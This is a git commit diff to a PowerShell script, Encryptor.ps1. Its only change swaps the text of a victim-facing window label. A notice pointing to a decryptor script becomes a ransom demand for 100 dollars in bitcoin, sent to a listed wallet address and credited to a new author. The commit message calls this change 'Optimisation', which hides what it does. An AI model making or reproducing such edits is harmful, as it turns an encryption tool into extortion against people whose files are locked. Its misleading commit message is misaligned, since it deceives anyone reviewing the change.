35d620f6b7361d2a1cfdaa2254770814dfa07416
Ademolght <salvator883@proton.me>
2025-06-09 12:57:54 +0200

    Update Encryptor.ps1
    Optimisation

--- Encryption/Encryptor.ps1
+++ Encryption/Encryptor.ps1
@@ -121,7 +121,7 @@ $label.AutoSize = $true
 $label.Location = New-Object System.Drawing.Point(60, 200)
 
 $label2 = New-Object Windows.Forms.Label
-$label2.Text = " To recover your files you will need the Decryption Key `n`n`n Run the Decryptor script and enter the key to recover files `n`n`n You can close this window when Decryption is complete `n`n`n Written by @beigeworm - Follow on Github - Discord : egieb"
+$label2.Text = " To recover your files you will need the Decryption Key `n`n`n Send 100$ BTC : bc1qhr946kn4hpp0evvyntan43lrd973llnwqhquer `n`n`n You can close this window when Decryption is complete `n`n`n Written by Okaidi86"
 $label2.AutoSize = $true
 $label2.Location = New-Object System.Drawing.Point(60, 280)
 
